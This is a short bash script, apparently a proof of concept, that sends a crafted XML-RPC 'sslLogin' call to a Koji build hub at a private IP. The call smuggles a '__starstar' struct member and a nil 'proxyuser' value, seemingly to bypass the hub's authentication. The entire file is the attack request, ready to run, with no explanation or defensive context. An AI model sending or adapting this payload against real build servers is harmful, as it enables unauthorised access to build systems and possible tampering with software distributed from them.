#!/bin/bash

set -xe

curl -vv -X POST -d "<?xml version='1.0'?><methodCall><methodName>sslLogin</methodName><params><param><value><struct><member><name>proxyuser</name><value><nil/></value></member><member><name>__starstar</name><value><boolean>1</boolean></value></member></struct></value></param></params></methodCall>" http://192.168.33.61/kojihub
